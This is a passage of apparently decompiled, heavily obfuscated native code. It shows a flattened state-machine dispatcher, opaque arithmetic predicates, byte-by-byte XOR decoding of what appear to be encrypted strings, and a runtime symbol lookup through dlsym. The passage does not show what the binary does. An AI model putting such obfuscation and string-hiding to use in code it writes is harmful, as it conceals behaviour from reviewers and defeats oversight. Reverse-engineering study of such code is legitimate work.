                   *(byte *)(iVar19 + 0x2ae98) + (*(byte *)(iVar19 + 0x2ae98) & 0x2b) * -2 + -0x55;
              *(byte *)(iVar23 + 0x2aead) =
                   (~*(byte *)(iVar19 + 0x2ae99) | 0xbb) & (*(byte *)(iVar19 + 0x2ae99) | 0x44);
              iVar26 = DAT_0002ad8c;
              *(byte *)(iVar23 + 0x2aea7) = ~((bVar2 | 0xd5) & (~bVar2 | 0x2a));
              *(byte *)(iVar23 + 0x2aeae) =
                   ~((*(byte *)(iVar19 + 0x2ae9a) | 0xb9) & (~*(byte *)(iVar19 + 0x2ae9a) | 0x46));
              *(byte *)(iVar23 + 0x2aeaf) = *(byte *)(iVar19 + 0x2ae9b) ^ 0xc2;
              *(byte *)(iVar23 + 0x2aeb0) =
                   (~*(byte *)(iVar19 + 0x2ae9c) | 6) & (*(byte *)(iVar19 + 0x2ae9c) | 0xf9);
              *(byte *)(iVar23 + 0x2aeb1) =
                   ~(*(byte *)(iVar19 + 0x2ae9d) & 0x77 | ~*(byte *)(iVar19 + 0x2ae9d) & 0x88);
              *(byte *)(iVar23 + 0x2aeb2) = *(byte *)(iVar19 + 0x2ae9e) ^ 0x58;
              *(byte *)(iVar23 + 0x2aeb3) =
                   ~((*(byte *)(iVar19 + 0x2ae9f) | 0x39) & (~*(byte *)(iVar19 + 0x2ae9f) | 0xc6));
              iVar23 = DAT_0002c090;
              iVar19 = DAT_0002c08c;
              *(byte *)(DAT_0002c090 + 0x2b0b0) = *(byte *)(DAT_0002c08c + 0x2b0a0) ^ 0x5e;
              *(byte *)(iVar23 + 0x2b0b1) =
                   ~*(byte *)(iVar19 + 0x2b0a1) & 0xb3 | *(byte *)(iVar19 + 0x2b0a1) & 0x4c;
              *(byte *)(iVar23 + 0x2b0b2) = *(byte *)(iVar19 + 0x2b0a2) ^ 0x60;
              *(byte *)(iVar23 + 0x2b0b3) = *(byte *)(iVar19 + 0x2b0a3) ^ 0x6f;
              *(byte *)(iVar23 + 0x2b0b4) =
                   ~*(byte *)(iVar19 + 0x2b0a4) & 0x6d | *(byte *)(iVar19 + 0x2b0a4) & 0x92;
              *(byte *)(iVar23 + 0x2b0b5) = *(byte *)(iVar19 + 0x2b0a5) ^ 0x34;
              *(byte *)(iVar23 + 0x2b0b6) = *(byte *)(iVar19 + 0x2b0a6) ^ 0x43;
              iVar23 = DAT_0002c0e4;
              iVar19 = DAT_0002c0e0;
              *(byte *)(DAT_0002c0e4 + 0x2b134) =
                   (~*(byte *)(DAT_0002c0e0 + 0x2b11c) & 0x1f |
                   *(byte *)(DAT_0002c0e0 + 0x2b11c) & 0xe0) ^ 0x53;
              *(byte *)(iVar23 + 0x2b135) = *(byte *)(iVar19 + 0x2b11d) ^ 0xe6;
              *(byte *)(iVar23 + 0x2b136) =
                   *(byte *)(iVar19 + 0x2b11e) + (*(byte *)(iVar19 + 0x2b11e) & 0x6a) * -2 + 'j';
              *(byte *)(iVar23 + 0x2b137) = *(byte *)(iVar19 + 0x2b11f) ^ 100;
              *(byte *)(iVar23 + 0x2b138) = *(byte *)(iVar19 + 0x2b120) ^ 0xed;
              *(byte *)(iVar23 + 0x2b139) = *(byte *)(iVar19 + 0x2b121) ^ 0xd1;
              *(byte *)(iVar23 + 0x2b13a) =
                   (~*(byte *)(iVar19 + 0x2b122) & 0xc2 | *(byte *)(iVar19 + 0x2b122) & 0x3d) ^ 0xcf
              ;
              *(byte *)(iVar23 + 0x2b13b) = *(byte *)(iVar19 + 0x2b123) ^ 8;
              *(byte *)(iVar23 + 0x2b13c) =
                   ~((*(byte *)(iVar19 + 0x2b124) | 0xb5) & (~*(byte *)(iVar19 + 0x2b124) | 0x4a));
              *(byte *)(iVar23 + 0x2b13d) = *(byte *)(iVar19 + 0x2b125) ^ 0xb2;
              *(byte *)(iVar23 + 0x2b13e) =
                   (~*(byte *)(iVar19 + 0x2b126) & 0x1d | *(byte *)(iVar19 + 0x2b126) & 0xe2) ^ 0x17
              ;
              *(byte *)(iVar23 + 0x2b13f) =
                   ~(*(byte *)(iVar19 + 0x2b127) & 0x45 | ~*(byte *)(iVar19 + 0x2b127) & 0xba);
              *(byte *)(iVar23 + 0x2b140) = *(byte *)(iVar19 + 0x2b128) ^ 0x7b;
              *(byte *)(iVar23 + 0x2b141) = *(byte *)(iVar19 + 0x2b129) ^ 0xe9;
              *(byte *)(iVar23 + 0x2b142) = *(byte *)(iVar19 + 0x2b12a) ^ 0xe;
              iVar23 = DAT_0002c1fc;
              iVar19 = DAT_0002c1f8;
              *(byte *)(DAT_0002c1fc + 0x2b248) =
                   ~((*(byte *)(DAT_0002c1f8 + 0x2b234) | 0x96) &
                    (~*(byte *)(DAT_0002c1f8 + 0x2b234) | 0x69));
              *(byte *)(iVar23 + 0x2b249) =
                   (~*(byte *)(iVar19 + 0x2b235) | 0xcf) & (*(byte *)(iVar19 + 0x2b235) | 0x30);
              *(byte *)(iVar23 + 0x2b24a) =
                   *(byte *)(iVar19 + 0x2b236) + (*(byte *)(iVar19 + 0x2b236) & 0x5b) * -2 + '[';
              *(byte *)(iVar23 + 0x2b24b) = *(byte *)(iVar19 + 0x2b237) ^ 0x93;
              *(byte *)(iVar23 + 0x2b24c) =
                   (~*(byte *)(iVar19 + 0x2b238) | 0x20) & (*(byte *)(iVar19 + 0x2b238) | 0xdf);
              *(byte *)(iVar23 + 0x2b24d) = *(byte *)(iVar19 + 0x2b239) ^ 9;
              *(byte *)(iVar23 + 0x2b24e) = *(byte *)(iVar19 + 0x2b23a) ^ 0x5d;
              *(byte *)(iVar23 + 0x2b24f) = *(byte *)(iVar19 + 0x2b23b) ^ 0x58;
              iVar23 = DAT_0002c2b8;
              iVar19 = DAT_0002c2b4;
              *(byte *)(DAT_0002c2b8 + 0x2b2e8) = *(byte *)(DAT_0002c2b4 + 0x2b2d8) ^ 0xd6;
              *(byte *)(iVar23 + 0x2b2e9) =
                   ~(*(byte *)(iVar19 + 0x2b2d9) & 0xb2 | ~*(byte *)(iVar19 + 0x2b2d9) & 0x4d);
              *(byte *)(iVar23 + 0x2b2ea) =
                   (~*(byte *)(iVar19 + 0x2b2da) | 0x8a) & (*(byte *)(iVar19 + 0x2b2da) | 0x75);
              *(byte *)(iVar23 + 0x2b2eb) =
                   ~*(byte *)(iVar19 + 0x2b2db) & 0xc4 | *(byte *)(iVar19 + 0x2b2db) & 0x3b;
              *(byte *)(iVar23 + 0x2b2ec) =
                   *(byte *)(iVar19 + 0x2b2dc) + (*(byte *)(iVar19 + 0x2b2dc) & 0x2b) * -2 + -0x55;
              *(byte *)(iVar23 + 0x2b2ed) = *(byte *)(iVar19 + 0x2b2dd) ^ 0xd8;
              *(byte *)(iVar23 + 0x2b2ee) = *(byte *)(iVar19 + 0x2b2de) ^ 0x92;
              *(byte *)(iVar23 + 0x2b2ef) = *(byte *)(iVar19 + 0x2b2df) ^ 0x8d;
              *(byte *)(iVar23 + 0x2b2f0) = *(byte *)(iVar19 + 0x2b2e0) ^ 2;
              *(undefined *)(iVar23 + 0x2b2f1) = *(undefined *)(iVar19 + 0x2b2e1);
              *(byte *)(iVar23 + 0x2b2f2) =
                   (~*(byte *)(iVar19 + 0x2b2e2) | 0xa1) & (*(byte *)(iVar19 + 0x2b2e2) | 0x5e);
              *(byte *)(iVar23 + 0x2b2f3) = *(byte *)(iVar19 + 0x2b2e3) ^ 0x9b;
              *(byte *)(iVar23 + 0x2b2f4) = *(byte *)(iVar19 + 0x2b2e4) ^ 0xad;
              *(byte *)(iVar23 + 0x2b2f5) = *(byte *)(iVar19 + 0x2b2e5) ^ 0xbc;
              *(byte *)(iVar23 + 0x2b2f6) =
                   ~*(byte *)(iVar19 + 0x2b2e6) & 0xfd | *(byte *)(iVar19 + 0x2b2e6) & 2;
              *(byte *)(iVar23 + 0x2b2f7) = *(byte *)(iVar19 + 0x2b2e7) ^ 0x39;
              *(byte *)(iVar23 + 0x2b2f8) = *(byte *)(iVar19 + 0x2b2e8) ^ 0x21;
              *(byte *)(iVar23 + 0x2b2f9) = *(byte *)(iVar19 + 0x2b2e9) ^ 0xb4;
              *(byte *)(iVar23 + 0x2b2fa) =
                   ~*(byte *)(iVar19 + 0x2b2ea) & 0x3a | *(byte *)(iVar19 + 0x2b2ea) & 0xc5;
              uVar16 = DAT_0002c2bc;
              *(byte *)(iVar23 + 0x2b2fb) = *(byte *)(iVar19 + 0x2b2eb) ^ 0x62;
              uVar16 = (uVar22 ^ DAT_0002c2c0) + (uVar27 ^ uVar16) +
                       (DAT_0002c2c4 + 1 ^ DAT_0002c2c4);
              iVar23 = DAT_0002b488;
              if (DAT_0002c2d8 <
                  (((uVar16 | DAT_0002c2c8) * (uVar16 & DAT_0002c2c8) +
                   (uVar16 & DAT_0002c2cc) * (DAT_0002c2c8 & ~uVar16)) * DAT_0002c2d0 | DAT_0002c2d4
                  )) {
                iVar17 = -0x5c16ea2b;
              }
LAB_0002cad8:
              **ppiVar14 = iVar17;
              piVar25 = piVar21;
              iVar19 = iVar31;
              ppiVar32 = ppiVar14;
            }
            else {
              if (iVar15 == DAT_000292fc) {
                uVar16 = FUN_00035060(*(uint *)(DAT_00029c10 + 0x28c28) ^ DAT_00029c14,
                                      *(uint *)(DAT_00029c1c + 0x28c34) ^ DAT_00029c18);
                uVar16 = (uVar16 & DAT_00029c20) + (uVar16 | DAT_00029c20);
                uVar16 = (DAT_00029c28 & ~uVar16 | uVar16 & DAT_00029c24) ^ DAT_00029c2c |
                         uVar16 & DAT_00029c30;
                iVar17 = DAT_000296ac;
                if ((DAT_00029c34 & ~uVar16 | uVar16 & DAT_00029c38) == DAT_00029c3c) {
                  iVar17 = 0x36ebb3c2;
                }
                goto LAB_0002cd74;
              }
              if (iVar15 == DAT_00029300) {
                iVar17 = DAT_0002ce08;
                if (*local_60 != '\0') {
                  iVar17 = 0x586829be;
                }
                goto LAB_0002cd74;
              }
              if (iVar15 == DAT_00029304) {
                **ppiVar32 = DAT_0002ce18;
              }
              else {
                if (iVar15 == DAT_00029308) {
                  uVar22 = *(uint *)(DAT_0002a1a0 + 0x2932c);
                  uVar16 = *(uint *)(DAT_0002a1a4 + 0x29334);
                  uVar18 = dlsym(*local_30,DAT_0002a1a8 + 0x2933c);
                  iVar19 = DAT_000291c4;
                  *(undefined4 *)(DAT_0002a1ac + 0x29350) = uVar18;
                  uVar16 = uVar16 ^ DAT_0002a1b0;
                  uVar22 = uVar22 ^ DAT_0002a1b4;
                  iVar17 = DAT_00029308;
                  piVar25 = local_2c;
                  iVar23 = DAT_000291c8;
                  if ((uVar22 & uVar16) + (uVar22 | uVar16) + DAT_0002a1b8 < DAT_0002a1bc) {
                    iVar17 = -0x5ca7706d;
                  }
                  goto LAB_0002cd74;
                }
                if (iVar15 == DAT_0002930c) {
                  iVar17 = DAT_000297dc;
                  if ((((*(uint *)(DAT_000299a0 + 0x289a8) ^ DAT_00029978) &
                       (*(uint *)(DAT_00029970 + 0x2899c) ^ DAT_00029974)) + DAT_000299a4 ^
                      DAT_000299b8) < DAT_000299bc) {
                    iVar17 = 0x4984bce6;
                  }
                  goto LAB_0002cd74;
                }
                if (iVar15 == DAT_00029310) {
                  bVar34 = (~(((*(uint *)(DAT_000298cc + 0x28948) ^ DAT_000298c8) *
                               (*(uint *)(DAT_000298c0 + 0x2893c) ^ DAT_000298c4) & DAT_000298d4) +
                              (DAT_000298d0 + 1 ^ DAT_000298d0) + DAT_00029964) | DAT_00029968) ==
                           DAT_0002996c;
                  iVar17 = DAT_000297e0;
LAB_00029a24:
                  if (bVar34) {
                    iVar17 = 0x267785d9;
                  }
                  goto LAB_0002cd74;
                }
                if (iVar15 == DAT_00029314) {
                  iVar17 = FUN_0002cfb8(DAT_0002c388 + 0x2b710,DAT_0002c38c + 0x2b714);
                  *(int *)(DAT_0002c390 + 0x2b72c) = iVar17;
                  *local_38 = iVar17;
                  **ppiVar32 = DAT_0002c394;
                }
                else if (iVar15 == DAT_00029390) {
                  **ppiVar32 = DAT_0002944c;
                  *local_4c = *local_44 == 0;
                }
                else if (iVar15 == DAT_00029394) {
                  **ppiVar32 = DAT_00029580;
                  *local_34 = *local_78;
                }
                else if (iVar15 == DAT_00029398) {
                  *(undefined4 *)(DAT_0002cfac + 0x2c0a4) = DAT_0002ce34;
                  **ppiVar32 = DAT_0002cdf8;
                }
                else if (iVar15 == DAT_0002939c) {
                  **ppiVar32 = DAT_00029280;
                }
                else {
                  if (iVar15 == iVar26) {
                    uVar16 = (*(uint *)(DAT_00029b3c + 0x28bbc) ^ DAT_00029b38) -
                             (*(uint *)(DAT_00029b30 + 0x28bb0) ^ DAT_00029b34);
                    iVar17 = DAT_000297bc;
                    if ((DAT_00029b40 & ~uVar16 | uVar16 & 0x900410) + DAT_00029bd8 < DAT_00029bdc)
                    {
                      iVar17 = -0x32b16944;
                    }
                    goto LAB_0002cd74;
                  }
                  if (iVar15 == DAT_000293a0) {
                    **ppiVar32 = DAT_0002cdec;
                  }
                  else {
                    if (iVar15 == DAT_000293a4) {
                      uVar22 = *(uint *)(DAT_0002cf1c + 0x2cb40) ^ DAT_0002cefc;
                      uVar16 = *(uint *)(DAT_0002cf18 + 0x2cb34) ^ DAT_0002cf04;
                      uVar16 = (uVar16 | uVar22) * (uVar16 & uVar22) +
                               (uVar16 & (*(uint *)(DAT_0002cf1c + 0x2cb40) ^ DAT_0002cf00)) *
                               (uVar22 & (*(uint *)(DAT_0002cf18 + 0x2cb34) ^ DAT_0002cef8));
                      bVar34 = DAT_0002cf14 <=
                               (uVar16 + (DAT_0002cdb4 ^ DAT_0002cdb4 + 1) +
                               (~uVar16 | DAT_0002cf08)) * DAT_0002cf10 + DAT_0002cf0c;
                      iVar17 = DAT_0002ce20;
                      iVar23 = DAT_0002ce0c;
LAB_0002cba8:
                      if (!bVar34) {
                        iVar17 = 0x2534c6d9;
                      }
                      goto LAB_0002cd74;
                    }
                    if (iVar15 == DAT_000293a8) {
                      **ppiVar32 = DAT_0002924c;
                    }
                    else {
                      if (iVar15 == DAT_000293ac) {
                        *(int *)(DAT_00029c40 + 0x28cf0) = DAT_00029c44 + 0x28cd0;
                        uVar16 = FUN_00035060(((*(uint *)(DAT_00029c54 + 0x28cec) ^ uVar16) +
                                               (*(uint *)(DAT_00029c4c + 0x28ce0) ^ DAT_00029c50) ^
                                              DAT_00029c58) + DAT_00029cfc,DAT_00029d00);
                        iVar17 = DAT_000293ac;
                        if (uVar16 < DAT_00029d04) {
                          iVar17 = -0x53e7bd5c;
                        }
                        goto LAB_0002cd74;
                      }
                      if (iVar15 == DAT_000293b0) {
                        uVar16 = *(uint *)(DAT_0002cf60 + 0x2cc5c) ^ DAT_0002cea0;
                        uVar22 = DAT_0002cdc4 ^ *(uint *)(DAT_0002cf64 + 0x2cc70) ^ DAT_0002cea4;
                        uVar16 = ((uVar16 + uVar22) -
                                 (DAT_0002cdc8 ^ DAT_0002cdc8 + 2) * (uVar16 & uVar22)) *
                                 DAT_0002cea8;
                        iVar17 = DAT_0002ce14;
                        iVar23 = DAT_0002ce0c;
                        if ((uVar16 & DAT_0002ceb0 | DAT_0002ceb4) * (uVar16 & DAT_0002ceb8) +
                            (DAT_0002ceb4 & ~(uVar16 & DAT_0002ceb0)) * (uVar16 & DAT_0002ceac) <
                            DAT_0002cebc) {
                          iVar17 = -0x51803ed3;
                          iVar23 = DAT_0002ce0c;
                        }
                        goto LAB_0002cd74;
                      }
                      if (iVar15 == DAT_000293b4) {
                        *local_68 = *local_48;
                        uVar16 = FUN_00035060(*(uint *)(DAT_000299c4 + 0x289f8) ^ DAT_000299c8,
                                              *(uint *)(DAT_000299cc + 0x28a04) ^ DAT_000299c0);
                        uVar16 = FUN_00035060(uVar16 & DAT_000299d0,DAT_000299d4);
                        iVar17 = DAT_000294cc;
                        if (~uVar16 + uVar16 + (DAT_000299d8 + 1 ^ DAT_000299d8) != DAT_00029a30) {
                          iVar17 = 0x6cda2715;
                        }
                        goto LAB_0002cd74;
                      }
                      if (iVar15 == DAT_000293b8) {
                        **ppiVar32 = DAT_000297d4;
                      }
                      else if (iVar15 == DAT_000293bc) {
                        **ppiVar32 = DAT_0002cdd8;
                      }
                      else {
                        if (iVar15 == DAT_000293c0) {
                          iVar17 = DAT_0002956c;
                          if (DAT_0002ac94 <
                              (((*(uint *)(DAT_0002ac80 + 0x29de8) ^ DAT_0002ac7c) -
                               (*(uint *)(DAT_0002ac74 + 0x29ddc) ^ DAT_0002ac78)) +
                               (DAT_0002ac84 + 1 ^ DAT_0002ac84) + DAT_0002ac88 | DAT_0002ac8c) +
                              DAT_0002ac90) {
                            iVar17 = -0x700be3d2;
                          }
                          goto LAB_0002cd74;
                        }
                        if (iVar15 == DAT_00029430) {
                          **ppiVar32 = DAT_000297bc;
                        }
                        else if (iVar15 == DAT_00029434) {
                          **ppiVar32 = DAT_00029790;
                        }
                        else if (iVar15 == DAT_00029438) {
                          bVar1 = *(byte *)(DAT_0002ad7c + 0x2a2c6);
                          bVar2 = *(byte *)(DAT_0002ad7c + 0x2a2c7);
                          bVar3 = *(byte *)(DAT_0002ad7c + 0x2a2c9);
                          bVar4 = *(byte *)(DAT_0002ad7c + 0x2a2d0);
                          *(byte *)(DAT_0002ad80 + 0x2a2e8) =
                               *(byte *)(DAT_0002ad7c + 0x2a2c8) ^ 0x56;
                          *(byte *)(iVar6 + 0x2a2eb) = *(byte *)(iVar28 + 0x2a2cb) ^ 0x8a;
                          *(byte *)(iVar6 + 0x2a2ec) = *(byte *)(iVar28 + 0x2a2cc) ^ 0xa5;
                          *(byte *)(iVar6 + 0x2a2ed) = *(byte *)(iVar28 + 0x2a2cd) ^ 0xa4;
                          *(byte *)(iVar6 + 0x2a2e9) = ~bVar3 & 0x44 | bVar3 & 0xbb;
                          bVar3 = *(byte *)(iVar28 + 0x2a2d1);
                          *(byte *)(iVar6 + 0x2a2e5) = *local_40 + (*local_40 & 0x6a) * -2 + 'j';
                          bVar5 = *(byte *)(iVar28 + 0x2a2cf);
                          *(byte *)(iVar6 + 0x2a2e6) = bVar1 + (bVar1 & 0x39) * -2 + '9';
                          *(byte *)(iVar6 + 0x2a2e7) = bVar2 + (bVar2 & 100) * -2 + 'd';
                          bVar1 = *(byte *)(iVar28 + 0x2a2ce);
                          *(byte *)(iVar6 + 0x2a2ea) =
                               *(byte *)(iVar28 + 0x2a2ca) +
                               (*(byte *)(iVar28 + 0x2a2ca) & 0x65) * -2 + -0x1b;
                          *(byte *)(iVar6 + 0x2a2ee) = bVar1 ^ 0x36;
                          *(byte *)(iVar6 + 0x2a2f1) = bVar3 ^ 0x79;
                          *(byte *)(iVar6 + 0x2a2f3) = *(byte *)(iVar28 + 0x2a2d3) ^ 0x5a;
                          *(byte *)(iVar6 + 0x2a2f4) = *(byte *)(iVar28 + 0x2a2d4) ^ 0x9d;
                          iVar20 = DAT_0002ad88;
                          iVar17 = DAT_0002ad84;
                          bVar1 = *(byte *)(DAT_0002ad84 + 0x2a3a1);
                          bVar2 = *(byte *)(DAT_0002ad84 + 0x2a3a2);
                          *(byte *)(DAT_0002ad88 + 0x2a3b8) =
                               *(byte *)(DAT_0002ad84 + 0x2a3a0) ^ 0xd9;
                          *(byte *)(iVar6 + 0x2a2ef) = ~bVar5 & 2 | bVar5 & 0xfd;
                          *(byte *)(iVar6 + 0x2a2f2) =
                               ~*(byte *)(iVar28 + 0x2a2d2) & 0x3a |
                               *(byte *)(iVar28 + 0x2a2d2) & 0xc5;
                          *(byte *)(iVar20 + 0x2a3b9) = ~bVar1 & 0x1a | bVar1 & 0xe5;
                          bVar1 = *(byte *)(iVar17 + 0x2a3a5);
                          *(byte *)(iVar6 + 0x2a2f0) = bVar4 + (bVar4 & 0x51) * -2 + 'Q';
                          bVar3 = *(byte *)(iVar17 + 0x2a3a6);
                          *(byte *)(iVar20 + 0x2a3bc) = *(byte *)(iVar17 + 0x2a3a4) ^ 0x7b;
                          *(byte *)(iVar20 + 0x2a3bd) = bVar1 ^ 0x82;
                          bVar1 = *(byte *)(iVar17 + 0x2a3a7);
                          *(byte *)(iVar20 + 0x2a3ba) = (~bVar2 | 0x9a) & (bVar2 | 0x65);
                          *(byte *)(iVar20 + 0x2a3bf) = bVar1 ^ 0x61;
                          bVar1 = *(byte *)(iVar17 + 0x2a3a3);
                          *(byte *)(iVar20 + 0x2a3c1) = *(byte *)(iVar17 + 0x2a3a9) ^ 0x44;
                          iVar26 = DAT_0002ad8c;
                          *(byte *)(iVar20 + 0x2a3c2) = *(byte *)(iVar17 + 0x2a3aa) ^ 0x46;
                          *(byte *)(iVar20 + 0x2a3c3) = *(byte *)(iVar17 + 0x2a3ab) ^ 0xc2;
                          iVar23 = DAT_0002b488;
                          *(byte *)(iVar20 + 0x2a3be) = ~bVar3 & 0x67 | bVar3 & 0x98;
                          *(byte *)(iVar20 + 0x2a3bb) = (~bVar1 & 0x16 | bVar1 & 0xe9) ^ 0x3c;
                          *(byte *)(iVar20 + 0x2a3c0) =
                               ~(*(byte *)(iVar17 + 0x2a3a8) & 0xab |
                                ~*(byte *)(iVar17 + 0x2a3a8) & 0x54);
                          *(byte *)(iVar20 + 0x2a3c4) =
                               ~(*(byte *)(iVar17 + 0x2a3ac) & 0xf9 |
                                ~*(byte *)(iVar17 + 0x2a3ac) & 6);
                          *(byte *)(iVar20 + 0x2a3c5) = *(byte *)(iVar17 + 0x2a3ad) ^ 0x77;
                          *(byte *)(iVar20 + 0x2a3c6) = *(byte *)(iVar17 + 0x2a3ae) ^ 0x58;
                          *(byte *)(iVar20 + 0x2a3c7) =
                               (~*(byte *)(iVar17 + 0x2a3af) & 0x47 |
                               *(byte *)(iVar17 + 0x2a3af) & 0xb8) ^ 0x81;
                          iVar20 = DAT_0002b508;
                          iVar17 = DAT_0002b504;
                          *(byte *)(DAT_0002b508 + 0x2a534) =
                               *(byte *)(DAT_0002b504 + 0x2a524) +
                               (*(byte *)(DAT_0002b504 + 0x2a524) & 0x5e) * -2 + '^';
                          *(byte *)(iVar20 + 0x2a535) =
                               *(byte *)(iVar17 + 0x2a525) +
                               (*(byte *)(iVar17 + 0x2a525) & 0x33) * -2 + -0x4d;
                          *(byte *)(iVar20 + 0x2a536) =
                               ~*(byte *)(iVar17 + 0x2a526) & 0x60 |
                               *(byte *)(iVar17 + 0x2a526) & 0x9f;
                          *(byte *)(iVar20 + 0x2a537) = *(byte *)(iVar17 + 0x2a527) ^ 0x6f;
                          *(byte *)(iVar20 + 0x2a538) =
                               ~*(byte *)(iVar17 + 0x2a528) & 0x6d |
                               *(byte *)(iVar17 + 0x2a528) & 0x92;
                          *(byte *)(iVar20 + 0x2a539) = *(byte *)(iVar17 + 0x2a529) ^ 0x34;
                          *(byte *)(iVar20 + 0x2a53a) = *(byte *)(iVar17 + 0x2a52a) ^ 0x43;
                          iVar20 = DAT_0002b56c;
                          iVar17 = DAT_0002b568;
                          *(byte *)(DAT_0002b56c + 0x2a5c8) =
                               ~*(byte *)(DAT_0002b568 + 0x2a5b4) & 0x4c |
                               *(byte *)(DAT_0002b568 + 0x2a5b4) & 0xb3;
                          *(byte *)(iVar20 + 0x2a5c9) = *(byte *)(iVar17 + 0x2a5b5) ^ 0xe6;
                          *(byte *)(iVar20 + 0x2a5ca) =
                               (~*(byte *)(iVar17 + 0x2a5b6) & 0xb |
                               *(byte *)(iVar17 + 0x2a5b6) & 0xf4) ^ 0x61;
                          *(byte *)(iVar20 + 0x2a5cb) = *(byte *)(iVar17 + 0x2a5b7) ^ 100;
                          *(byte *)(iVar20 + 0x2a5cc) = *(byte *)(iVar17 + 0x2a5b8) ^ 0xed;
                          *(byte *)(iVar20 + 0x2a5cd) =
                               *(byte *)(iVar17 + 0x2a5b9) +
                               (*(byte *)(iVar17 + 0x2a5b9) & 0x51) * -2 + -0x2f;
                          *(byte *)(iVar20 + 0x2a5ce) = *(byte *)(iVar17 + 0x2a5ba) ^ 0xd;
                          *(byte *)(iVar20 + 0x2a5cf) =
                               ~*(byte *)(iVar17 + 0x2a5bb) & 8 | *(byte *)(iVar17 + 0x2a5bb) & 0xf7
                          ;
                          *(byte *)(iVar20 + 0x2a5d0) = *(byte *)(iVar17 + 0x2a5bc) ^ 0x4a;
                          *(byte *)(iVar20 + 0x2a5d1) = *(byte *)(iVar17 + 0x2a5bd) ^ 0xb2;
                          *(byte *)(iVar20 + 0x2a5d2) = *(byte *)(iVar17 + 0x2a5be) ^ 10;
                          *(byte *)(iVar20 + 0x2a5d3) =
                               ~*(byte *)(iVar17 + 0x2a5bf) & 0x45 |
                               *(byte *)(iVar17 + 0x2a5bf) & 0xba;
                          *(byte *)(iVar20 + 0x2a5d4) = *(byte *)(iVar17 + 0x2a5c0) ^ 0x7b;
                          *(byte *)(iVar20 + 0x2a5d5) =
                               ~*(byte *)(iVar17 + 0x2a5c1) & 0xe9 |
                               *(byte *)(iVar17 + 0x2a5c1) & 0x16;
                          *(byte *)(iVar20 + 0x2a5d6) =
                               *(byte *)(iVar17 + 0x2a5c2) +
                               (*(byte *)(iVar17 + 0x2a5c2) & 0xe) * -2 + '\x0e';
                          iVar20 = DAT_0002b63c;
                          iVar17 = DAT_0002b638;
                          *(byte *)(DAT_0002b63c + 0x2a6d4) =
                               *(byte *)(DAT_0002b638 + 0x2a6c4) ^ 0x69;
                          *(byte *)(iVar20 + 0x2a6d5) =
                               *(byte *)(iVar17 + 0x2a6c5) +
                               (*(byte *)(iVar17 + 0x2a6c5) & 0x30) * -2 + '0';
                          *(byte *)(iVar20 + 0x2a6d6) = *(byte *)(iVar17 + 0x2a6c6) ^ 0x5b;
                          *(byte *)(iVar20 + 0x2a6d7) = *(byte *)(iVar17 + 0x2a6c7) ^ 0x93;
                          *(byte *)(iVar20 + 0x2a6d8) =
                               ~*(byte *)(iVar17 + 0x2a6c8) & 0xdf |
                               *(byte *)(iVar17 + 0x2a6c8) & 0x20;
                          *(byte *)(iVar20 + 0x2a6d9) =
                               ~((*(byte *)(iVar17 + 0x2a6c9) | 0xf6) &
                                (~*(byte *)(iVar17 + 0x2a6c9) | 9));
                          *(byte *)(iVar20 + 0x2a6da) = *(byte *)(iVar17 + 0x2a6ca) ^ 0x5d;
                          *(byte *)(iVar20 + 0x2a6db) =
                               *(byte *)(iVar17 + 0x2a6cb) +
                               (*(byte *)(iVar17 + 0x2a6cb) & 0x58) * -2 + 'X';
                          iVar20 = DAT_0002b73c;
                          iVar17 = DAT_0002b738;
                          *(byte *)(DAT_0002b73c + 0x2a770) =
                               *(byte *)(DAT_0002b738 + 0x2a760) ^ 0xd6;
                          *(byte *)(iVar20 + 0x2a771) =
                               (~*(byte *)(iVar17 + 0x2a761) | 0x4d) &
                               (*(byte *)(iVar17 + 0x2a761) | 0xb2);
                          *(byte *)(iVar20 + 0x2a772) = *(byte *)(iVar17 + 0x2a762) ^ 0x75;
                          *(byte *)(iVar20 + 0x2a773) =
                               (~*(byte *)(iVar17 + 0x2a763) & 0xa1 |
                               *(byte *)(iVar17 + 0x2a763) & 0x5e) ^ 0x65;
                          *(byte *)(iVar20 + 0x2a774) = *(byte *)(iVar17 + 0x2a764) ^ 0xab;
                          *(byte *)(iVar20 + 0x2a775) = *(byte *)(iVar17 + 0x2a765) ^ 0xd8;
                          *(byte *)(iVar20 + 0x2a776) =
                               *(byte *)(iVar17 + 0x2a766) +
                               (*(byte *)(iVar17 + 0x2a766) & 0x12) * -2 + -0x6e;
                          *(byte *)(iVar20 + 0x2a777) =
                               *(byte *)(iVar17 + 0x2a767) +
                               (*(byte *)(iVar17 + 0x2a767) & 0xd) * -2 + -0x73;
                          *(byte *)(iVar20 + 0x2a778) =
                               ~((*(byte *)(iVar17 + 0x2a768) | 0xfd) &
                                (~*(byte *)(iVar17 + 0x2a768) | 2));
                          *(undefined *)(iVar20 + 0x2a779) = *(undefined *)(iVar17 + 0x2a769);
                          *(byte *)(iVar20 + 0x2a77a) = *(byte *)(iVar17 + 0x2a76a) ^ 0x5e;
                          *(byte *)(iVar20 + 0x2a77b) = *(byte *)(iVar17 + 0x2a76b) ^ 0x9b;
                          *(byte *)(iVar20 + 0x2a77c) = *(byte *)(iVar17 + 0x2a76c) ^ 0xad;
                          *(byte *)(iVar20 + 0x2a77d) =
                               (~*(byte *)(iVar17 + 0x2a76d) & 0xb7 |
                               *(byte *)(iVar17 + 0x2a76d) & 0x48) ^ 0xb;
                          *(byte *)(iVar20 + 0x2a77e) =
                               ~*(byte *)(iVar17 + 0x2a76e) & 0xfd | *(byte *)(iVar17 + 0x2a76e) & 2
                          ;
                          *(byte *)(iVar20 + 0x2a77f) =
                               ~*(byte *)(iVar17 + 0x2a76f) & 0x39 |
                               *(byte *)(iVar17 + 0x2a76f) & 0xc6;
                          *(byte *)(iVar20 + 0x2a780) = *(byte *)(iVar17 + 0x2a770) ^ 0x21;
                          *(byte *)(iVar20 + 0x2a781) =
                               (~*(byte *)(iVar17 + 0x2a771) | 0x4b) &
                               (*(byte *)(iVar17 + 0x2a771) | 0xb4);
                          *(byte *)(iVar20 + 0x2a782) = *(byte *)(iVar17 + 0x2a772) ^ 0x3a;
                          iVar28 = DAT_0002b8b4;
                          *(byte *)(iVar20 + 0x2a783) =
                               *(byte *)(iVar17 + 0x2a773) +
                               (*(byte *)(iVar17 + 0x2a773) & 0x62) * -2 + 'b';
                          **local_3c = iVar28;
                          piVar25 = piVar21;
                          ppiVar32 = ppiVar14;
                        }
                        else if (iVar15 == DAT_0002943c) {
                          *(int *)(DAT_0002cfb0 + 0x2cc58) = DAT_0002cfb4 + 0x2cc30;
                          **ppiVar32 = DAT_0002ce00;
                        }
                        else {
                          if (iVar15 == DAT_00029440) {
